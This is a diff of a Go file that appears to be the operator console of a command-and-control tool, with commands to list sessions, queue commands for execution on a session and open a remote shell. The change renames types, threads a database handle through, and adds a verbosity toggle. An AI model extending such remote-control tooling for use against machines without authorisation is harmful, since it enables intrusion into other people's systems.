@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"database/sql"
 	"fmt"
 	"log"
 	"strconv"
@@ -10,15 +11,15 @@ import (
 
 // //////// LISTS ///////////////
 // //// AVAILABLE COMMANDS
-var commands = []Command{}
+var commands = []InputCommand{}
 
 // ///////////  LOGS / CONSOLE MANAGEMENT ////////////////
 
-func NewCommand(name string, args []string, noMaxArgs bool, description string) Command {
+func NewCommand(name string, args []string, noMaxArgs bool, description string) InputCommand {
 	if !noMaxArgs {
 		noMaxArgs = true
 	}
-	return Command{name, args, noMaxArgs, description}
+	return InputCommand{name, args, noMaxArgs, description}
 }
 func InitCommands() {
 	commands = append(commands, NewCommand("help", []string{}, false, "Show help"))
@@ -26,6 +27,7 @@ func InitCommands() {
 	commands = append(commands, NewCommand("show", []string{"sessions / sessiond_id"}, false, "Show session list"))
 	commands = append(commands, NewCommand("exec", []string{"session_id", "args"}, true, "Execute a command on a specified session"))
 	commands = append(commands, NewCommand("shell", []string{"session_id"}, false, "Start a remote shell session on a specified session"))
+	commands = append(commands, NewCommand("verbosity", []string{"enable / disable"}, false, "Enable / disable program's verbosity"))
 
 }
 
@@ -47,7 +49,8 @@ func Help() {
 
 }
 
-func ExecCmd(sid string, args []string) {
+func ExecCmd(sid string, args []string, db *sql.DB) {
+	ZAvailability(sid, db)
 	argsMap := argsToMap(args)
 	queueMutex.Lock()
 	commandQueue[sid] = &ResHeartBeat{
@@ -55,10 +58,11 @@ func ExecCmd(sid string, args []string) {
 		Args: argsMap,
 	}
 	queueMutex.Unlock()
-	Log(l, "Command Queue: "+"SID: "+sid+" Type: "+commandQueue[sid].Type+" Arguments: "+strings.Join(args, " "))
+	LogEx(l, "InputCommand Queue: "+"SID: "+sid+" Type: "+commandQueue[sid].Type+" Arguments: "+strings.Join(args, " "), true)
 }
 
-func UserInput(r *bufio.Reader) {
+// TODO: find another way to interact with db cuz thats weird, nah?
+func UserInput(r *bufio.Reader, db *sql.DB) {
 	for {
 		fmt.Print(inputPrefix)
 		input, err := r.ReadString('\n')
@@ -67,11 +71,23 @@ func UserInput(r *bufio.Reader) {
 		}
 		input = strings.TrimSpace(input)
 
-		Interpreter(l, input)
+		Interpreter(l, input, db)
 	}
 }
 
-func Interpreter(l *log.Logger, input string) {
+func ChangeVerbosity(state string) {
+	state = strings.ToLower(state)
+	if state == "1" {
+		*verbose = true
+		LogEx(l, "[VERBOSITY] Verbosity enabled", true)
+	} else if state == "0" {
+		*verbose = false
+		LogEx(l, "[VERBOSITY] Verbosity disabled", true)
+
+	}
+}
+
+func Interpreter(l *log.Logger, input string, db *sql.DB) {
 	if input == "" {
 		return
 	}
@@ -89,7 +105,7 @@ func Interpreter(l *log.Logger, input string) {
 
 	}
 	if command.Name == "" {
-		Error(l, "Command not found, type help")
+		Error(l, "InputCommand not found, type help")
 		return
 	}
 
@@ -111,8 +127,12 @@ func Interpreter(l *log.Logger, input string) {
 	case "exec":
 		sid := splittedInput[1]
 		args := splittedInput[2:]
-		ExecCmd(sid, args)
+		ExecCmd(sid, args, db)
 
+	case "verbosity":
+		state := splittedInput[1]
+
+		ChangeVerbosity(state)
 	}
 
 }
